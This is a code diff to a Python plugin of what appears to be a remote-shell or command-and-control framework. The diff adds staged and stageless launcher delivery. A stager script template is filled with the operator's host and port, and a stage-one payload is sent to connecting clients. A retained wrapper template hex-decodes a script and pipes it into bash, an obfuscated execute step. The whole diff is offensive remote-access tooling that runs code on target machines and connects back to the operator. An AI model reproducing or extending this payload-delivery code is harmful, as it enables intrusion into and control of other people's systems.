@@ -27,6 +27,7 @@ class ShellSocketPlugin(contract.IPluginExtension[ShellSocketConfig]):
     version = "1.0.0"
     author = "github.com/othonhugo"
     options_type = ShellSocketConfig
+
     routes = {
         config.OfficialRoute.LOAD.value: core.OFFICIAL_ROUTES[config.OfficialRoute.LOAD.value],
         config.OfficialRoute.COMMAND.value: core.OFFICIAL_ROUTES[config.OfficialRoute.COMMAND.value],
@@ -34,6 +35,13 @@ class ShellSocketPlugin(contract.IPluginExtension[ShellSocketConfig]):
         config.OfficialRoute.UPLOAD.value: core.OFFICIAL_ROUTES[config.OfficialRoute.UPLOAD.value],
         config.OfficialRoute.EXECUTE.value: core.OFFICIAL_ROUTES[config.OfficialRoute.EXECUTE.value],
     }
+
+    supported_launcher_kinds: frozenset[config.LauncherKind] = frozenset(
+        {
+            config.LauncherKind.STAGED,
+            config.LauncherKind.STAGELESS,
+        }
+    )
 
     @classmethod
     def configure_parser(cls, parser: contract.IArgumentParser, /) -> None:
@@ -80,6 +88,12 @@ class ShellSocketPlugin(contract.IPluginExtension[ShellSocketConfig]):
         if not launcher_file.is_file():
             raise config.ParserError(f"Client launcher file does not exist: {launcher_file}")
 
+        if plugin_config.launcher_kind is config.LauncherKind.STAGED:
+            stager_file = plugin_config.filesystem.launchers / "shell_socket_stager.sh"
+
+            if not stager_file.is_file():
+                raise config.ParserError(f"Stager launcher file does not exist: {stager_file}")
+
     @classmethod
     def build_runtime(cls, plugin_config: contract.PluginConfig[ShellSocketConfig], /) -> contract.IPluginRuntime:
         """Build the shell_socket runtime from client configuration."""
@@ -93,6 +107,7 @@ class ShellSocketRuntime(contract.IPluginRuntime):
     DEFAULT_WRAPPER_TEMPLATE: Final[str] = (
         """bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\\\x$byte"; done | bash' _ '$DECLUSOR_SCRIPT'"""
     )
+    STAGED_WRAPPER_TEMPLATE: Final[str] = "bash -c '$DECLUSOR_SCRIPT'"
 
     def __init__(self, plugin_config: contract.PluginConfig[ShellSocketConfig], /) -> None:
         self._plugin_config = plugin_config
@@ -110,25 +125,41 @@ class ShellSocketRuntime(contract.IPluginRuntime):
     def launcher(self) -> contract.LauncherDelivery:
         """Return the rendered shell client launcher delivery envelope."""
 
+        kind = self._plugin_config.launcher_kind
         rendered_bytes = self._processor.render_launcher(
             self._plugin_config.host,
             self._plugin_config.port,
             self._expected_ack,
+            kind=kind,
         )
+
+        wrapper = self.STAGED_WRAPPER_TEMPLATE if kind is config.LauncherKind.STAGED else self.DEFAULT_WRAPPER_TEMPLATE
 
         return contract.LauncherDelivery(
             script=rendered_bytes,
-            wrapper_template=self.DEFAULT_WRAPPER_TEMPLATE,
+            wrapper_template=wrapper,
+            kind=kind,
         )
 
     def create_connection(self, transport: contract.ITransport, /) -> contract.IConnection:
         """Create a shell_socket connection for an accepted transport channel."""
+
+        stage1_payload: bytes | None = None
+        if self._plugin_config.launcher_kind is config.LauncherKind.STAGED:
+            stageless_bytes = self._processor.render_launcher(
+                self._plugin_config.host,
+                self._plugin_config.port,
+                self._expected_ack,
+                kind=config.LauncherKind.STAGELESS,
+            )
+            stage1_payload = bytes.fromhex(stageless_bytes.decode("ascii"))
 
         return ShellSocketConnection(
             transport,
             self._renderer,
             self._processor,
             timeout=self._plugin_config.timeout or config.DEFAULT_CONNECTION_TIMEOUT,
+            stage1_payload=stage1_payload,
         )
 
 
@@ -163,17 +194,44 @@ class ShellSocketProcessor(contract.IPluginProcessor):
 
         return b"\n".join(all_helpers.values())
 
-    def render_launcher(self, host: str, port: int, acknowledge: bytes, /) -> bytes:
-        """Read, interpolate, and hex-encode the client launcher script.
+    def render_launcher(
+        self,
+        host: str,
+        port: int,
+        acknowledge: bytes,
+        /,
+        *,
+        kind: config.LauncherKind = config.LauncherKind.STAGELESS,
+    ) -> bytes:
+        """Read, interpolate, and render the client launcher script.
 
         Args:
             host: Host address embedded in the client script.
             port: Port embedded in the client script.
             acknowledge: Client acknowledgment bytes embedded in the script.
+            kind: Launcher distribution kind (staged or stageless).
 
         Returns:
-            The hex-encoded client bootstrap script as ASCII bytes.
+            The rendered launcher script as bytes (hex-encoded for stageless, UTF-8 for staged).
         """
+
+        if kind is config.LauncherKind.STAGED:
+            stager_path = self._filesystem.launchers / "shell_socket_stager.sh"
+
+            try:
+                stager_template = stager_path.read_text(encoding="utf-8")
+            except OSError as error:
+                raise config.ConnectionError(f"Failed to read stager script: {error}") from error
+
+            rendered = util.format_template(
+                stager_template,
+                HOST=host,
+                PORT=str(port),
+                DECLUSOR_HOST=host,
+                DECLUSOR_PORT=str(port),
+            )
+
+            return rendered.strip().encode("utf-8")
 
         launcher_path = self._filesystem.launchers / "shell_socket_client.sh"
 
